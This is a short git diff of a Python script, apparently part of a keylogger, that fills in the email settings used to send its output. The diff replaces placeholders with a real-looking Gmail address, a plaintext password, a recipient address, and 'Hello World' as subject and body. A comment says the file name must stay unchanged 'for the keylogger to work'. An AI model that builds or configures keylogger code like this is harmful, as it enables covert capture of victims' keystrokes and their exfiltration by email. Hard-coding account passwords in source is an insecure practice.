@@ -12,11 +12,11 @@ from email import encoders
 
 #put your gmail id, password, sender address over here
 
-email_user = 'fill_your_email_adress'
-email_password = 'fill_your_email_password'
-email_send = 'fill_in_the_email_address_you_are_sending_this_to'
+email_user = 'yeonkim411@gmail.com'
+email_password = 'toomuchmoney'
+email_send = 'akikoishida411@gmail.com'
 #put any subject you like
-subject = 'whatever_you_want_the_subject_to_be'
+subject = 'Hello World'
 
 #fill in the body of the email
 
@@ -25,7 +25,7 @@ msg['From'] = email_user
 msg['To'] = email_send
 msg['Subject'] = subject
 #put any body you like
-body = 'whatever_you_want_the_body_of_the_email_to_be'
+body = 'Hello World'
 msg.attach(MIMEText(body,'plain'))
 
 #do not change the file name for the keylogger to work
